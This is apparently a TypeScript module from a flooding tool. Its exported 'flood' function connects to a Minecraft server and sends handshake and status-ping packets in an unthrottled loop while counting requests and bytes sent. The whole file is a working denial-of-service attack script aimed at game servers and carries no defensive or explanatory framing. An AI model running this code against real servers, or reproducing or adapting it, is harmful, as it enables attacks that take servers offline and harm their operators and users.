import * as net from "net"

function parseUrl(url: string): { host: string; port: number } {
  const u = new URL(url.startsWith("http") ? url : `http://${url}`)
  return {
    host: u.hostname,
    port: parseInt(u.port) || 25565,
  }
}

function varint(d: number): Buffer {
  const out: number[] = []
  while (true) {
    let b = d & 0x7f
    d >>= 7
    if (d > 0) b |= 0x80
    out.push(b)
    if (d === 0) break
  }
  return Buffer.from(out)
}

function packPacket(id: number, ...parts: Buffer[]): Buffer {
  const data = Buffer.concat([varint(id), ...parts])
  return Buffer.concat([varint(data.length), data])
}

function handshake(host: string, port: number, protocolId: number): Buffer {
  const hostBuf = Buffer.from(host, "utf-8")
  const portBuf = Buffer.alloc(2)
  portBuf.writeUInt16BE(port, 0)
  return packPacket(
    0,
    varint(protocolId),
    varint(hostBuf.length),
    hostBuf,
    portBuf,
    varint(1)
  )
}

function pingPacket(): Buffer {
  return packPacket(0, Buffer.from([0]))
}

export async function flood(
  url: string,
  _rpc: number,
  onStats: (req: number, bytes: number) => void
): Promise<void> {
  const { host, port } = parseUrl(url)
  const handshakeBuf = handshake(host, port, 74)
  const pingBuf = pingPacket()

  const run = () => {
    return new Promise<void>((resolve) => {
      const sock = net.createConnection({ host, port }, () => {
        const send = () => {
          try {
            sock.write(handshakeBuf)
            sock.write(pingBuf)
            onStats(1, handshakeBuf.length + pingBuf.length)
            setImmediate(send)
          } catch {
            resolve()
          }
        }
        send()
      })
      sock.on("error", () => resolve())
      sock.on("close", () => resolve())
      sock.setTimeout(5000, () => {
        sock.destroy()
        resolve()
      })
    })
  }

  await run()
}
